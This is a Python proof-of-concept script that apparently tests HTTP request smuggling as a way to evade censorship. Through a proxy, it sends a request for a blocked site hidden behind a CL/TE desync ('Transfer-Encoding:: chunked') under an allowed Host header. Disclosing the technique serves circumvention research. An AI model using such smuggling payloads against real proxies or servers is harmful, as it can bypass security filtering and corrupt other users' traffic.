import socket
import re

CLEAN_URL = "irangov.ir"
_CENSORED_URL = "ww12.senario.net"

# This proof of concept requires a proxy to circumvent IP-based censorship.
PROXY_HOST = "" #Enter proxy IP
PROXY_PORT = 0 #Enter proxy port


NORMAL_REQ = b'GET / HTTP/1.1\r\nHost: ww12.senario.net\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.3\r\n\r\n'
# Smuggled request with CL/TE*-double-colon modification
SMUGGLE_REQ = b'GET / HTTP/1.1\r\nHost: irangov.ir\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.3\r\nContent-Length: 161\r\nTransfer-Encoding:: chunked\r\n\r\n0\r\n\r\nGET / HTTP/1.1\r\nHost: ww12.senario.net\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.3\r\n\r\n'

pattern = r'HTTP/\d\.\d\s(\d{3})\s'

def _parse_response(chunks):
    response = b''
    for chunk in chunks:
        response += chunk
    response_short = []
    for match in re.finditer(pattern, response.decode()):
        response_code = match.group(1)
        response_short.append(response_code)
    
    return response_short

print("URL: " + _CENSORED_URL)
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    try:
        print("Trying unsmuggled..")
        s.settimeout(20)
        s.connect((PROXY_HOST, PROXY_PORT))
        s.send(NORMAL_REQ)
        chunks = []
        while True:
            res = s.recv(4096)
            if not res:
                break
            chunks.append(res)
    except Exception as e:
        print(e)
    else:
        print(_parse_response(chunks))

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    try:
        print("Trying smuggled..")
        s.settimeout(20)
        s.connect((PROXY_HOST, PROXY_PORT))
        s.send(SMUGGLE_REQ)
        chunks = []
        while True:
            res = s.recv(4096)
            print(res)
            if not res:
                break
            chunks.append(res)
    except Exception as e:
        print(e)
    else:
        print(_parse_response(chunks))